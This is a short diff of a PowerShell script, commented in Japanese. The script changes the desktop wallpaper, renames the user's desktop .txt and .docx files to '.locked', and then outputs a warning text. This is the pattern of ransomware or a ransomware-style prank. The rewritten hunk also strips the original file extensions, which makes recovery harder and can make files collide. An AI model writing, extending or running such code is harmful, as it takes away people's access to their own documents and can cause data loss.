@@ -28,14 +28,10 @@ public class Wallpaper {
 Add-Type $code
 [Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)
 
-# デスクトップ上の .txt と .docx ファイルをリネーム
-$targetExtensions = @("*.txt", "*.docx")
-
-foreach ($ext in $targetExtensions) {
-    Get-ChildItem $desktop -Filter $ext | ForEach-Object {
-        $newName = "$($_.Name).locked"
-        Rename-Item -Path $_.FullName -NewName $newName -Force
-    }
+# .txt, .docx ファイルを .locked にリネーム
+Get-ChildItem $desktop -Include *.txt, *.docx -File | ForEach-Object {
+    $newName = "$($_.BaseName).locked"
+    Rename-Item $_.FullName -NewName $newName -Force
 }
 
 # 警告テキスト出力
